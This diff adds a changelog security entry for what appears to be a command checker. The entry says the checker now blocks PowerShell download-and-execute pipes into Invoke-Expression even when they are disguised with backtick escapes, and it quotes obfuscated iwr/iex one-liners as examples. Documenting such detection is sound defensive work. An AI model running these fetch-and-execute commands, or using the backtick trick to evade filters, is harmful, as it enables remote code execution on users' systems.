@@ -1,0 +1,2 @@
+### Security
+- The check for a download piped into `Invoke-Expression` now reads PowerShell backtick escapes, so ``i`wr https://example.com/i.ps1 | i`ex`` and ``Invoke-`WebRequest ... | Invoke-`Expression`` are blocked like `iwr ... | iex`. Only a backtick inside a word is read this way; in a POSIX command a backtick is a command substitution and is left alone, and Markdown-style backticks such as ``echo use `iwr` | cat`` are still allowed.
